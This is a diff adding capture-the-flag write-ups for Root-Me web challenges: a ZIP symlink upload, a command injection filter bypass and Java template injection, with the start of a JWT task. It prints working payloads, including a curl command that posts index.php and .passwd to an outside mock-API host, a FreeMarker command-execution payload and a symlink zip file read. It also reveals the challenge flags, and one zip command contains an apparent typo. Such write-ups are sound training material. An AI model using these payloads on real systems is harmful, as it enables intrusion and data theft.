@@ -631,3 +631,129 @@ Read password: `content={{self._TemplateReference__context.cycler.__init__.__glo
 ```
 {"content":"Python_SST1_1s_co0l_4nd_mY_p4yl04ds_4r3_1ns4n3!!!\n","title":"123"}
 ```
+
+### File upload - ZIP
+
+Your goal is to read index.php file.
+
+When I upload .zip file contain test.php, the application auto unzip and show all file in: /tmp/upload/623e84e1156845.25011439/
+
+```
+http://challenge01.root-me.org/web-serveur/ch51/tmp/upload/623e84e1156845.25011439/
+
+8caba7d65b81501f3b65eca199c28ace.zip	194 B	2022-Mar-26 04:13
+test.php
+```
+
+But when I access test.php, the application return 403 Forbidden. Because we don't have access permission in /tmp/upload.
+
+Hmm, we will create symbolic link from test.php to index.php file, because we can access to index.php page.
+
+```
+ln -s ../../../index.php ./test.php
+zip --symlinks -r test.zip ./test.php
+```
+
+Upload .zip file and open test.php, it doesn't working!, may be the application prevent .php file extension.
+
+Let's change the extension to .txt.
+
+```
+ln -s ../../../index.php ./a.txt
+zip --symlinks -r a.zip ./a.zip
+```
+
+Upload .zip file and open a.txt:
+
+```
+<?php
+if(isset($_FILES['zipfile'])){
+    if($_FILES['zipfile']['type']==="application/zip" || $_FILES['zipfile']['type']==="application/x-zip-compressed" || $_FILES['zipfile']['type']==="application/octet-stream"){
+        $uploaddir = 'tmp/upload/'.uniqid("", true).'/';
+        mkdir($uploaddir, 0750, true);
+        $uploadfile = $uploaddir . md5(basename($_FILES['zipfile']['name'])).'.zip';
+        if (move_uploaded_file($_FILES['zipfile']['tmp_name'], $uploadfile)) {
+            $message = "<p>File uploaded</p> ";
+        }
+        else{
+            $message = "<p>Error!</p>";
+        }
+	
+        $zip = new ZipArchive;
+        if ($zip->open($uploadfile)) {
+            // Don't know if this is safe, but it works, someone told me the flag is N3v3r_7rU5T_u5Er_1npU7 , did not understand what it means
+            exec("/usr/bin/timeout -k2 3 /usr/bin/unzip '$uploadfile' -d '$uploaddir'", $output, $ret);
+            $message = "<p>File unzipped <a href='".$uploaddir."'>here</a>.</p>";
+	    $zip->close();
+        }
+	else{
+		$message = "<p> Decompression Error </p>";
+	}
+    }
+    else{
+		
+	$message = "<p> Error bad file type ! <p>";
+    }
+
+}
+?>
+```
+
+The flag is: N3v3r_7rU5T_u5Er_1npU7
+
+### Command injection - Filter bypass
+
+Find a vulnerability in this service and exploit it. Some protections were added. The flag is on the index.php file.
+
+After testing, we can exploit by payload `ip=127.0.0.1%0A<another cmd>`
+
+I tried to use `ip=127.0.0.1%0Als`, the response is only `Ping OK` and don't show the tree directory, same as `ip=127.0.0.1%0Acat index.php`, ...
+
+Let's creat mock api server by beeceptor, https://hoang-rootme.free.beeceptor.com and use payload:
+
+`ip=127.0.0.1%0Acurl https://hoang-rootme.free.beeceptor.com`
+
+In mock api https://hoang-rootme.free.beeceptor.com, we can see GET response.
+
+Now, we will use curl to POST file from the application to mock api with payload:
+
+`ip=127.0.0.1%0Acurl -X POST https://hoang-rootme.free.beeceptor.com -d @index.php`
+
+In mock api we can see the response:
+
+```
+Hey ya! Great to see you here. Btw, nothing is configured for this request path. Create a rule and start building a mock API.
+
+<html><head><title>Ping Service</title></head><body><form method="POST" action="index.php">        <input type="text" name="ip" placeholder="127.0.0.1">        <input type="submit"></form><pre><?php $flag = "".file_get_contents(".passwd")."";if(isset($_POST["ip"]) && !empty($_POST["ip"])){        $ip = @preg_replace("/[\\\$|`;&<>]/", "", $_POST["ip"]);	//$ip = @str_replace(['\\', '$', '|', '`', ';', '&', '<', '>'], "", $_POST["ip"]);        $response = @shell_exec("timeout 5 bash -c 'ping -c 3 ".$ip."'");        $receive = @preg_match("/3 packets transmitted, (.*) received/s",$response,$out);        if ($out[1]=="3")         {                echo "Ping OK";        }        elseif ($out[1]=="0")        {                echo "Ping NOK";        }        else        {                echo "Syntax Error";        }}?></pre></body></html>
+```
+
+Finally,  get the password:
+
+`ip=127.0.0.1%0Acurl -X POST https://hoang-rootme.free.beeceptor.com -d @.passwd`
+
+```
+Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!
+```
+
+### Java - Server-side Template Injection
+
+With basic payload `${7*7}`, we can see the response:
+
+```
+It's seems that I know you :) 49
+```
+
+Now we can get the flag by payload: `${"freemarker.template.utility.Execute"?new()("cat SECRET_FLAG.txt")}`
+
+```
+B3wareOfT3mplat3Inj3ction
+```
+
+### JSON Web Token (JWT) - Public key
+
+You find an API with 3 endpoints:
+/key (accessible with GET)
+/auth (accessible with POST)
+/admin (accessible with POST)
+There is sure to be important data in the admin section, access it!
+
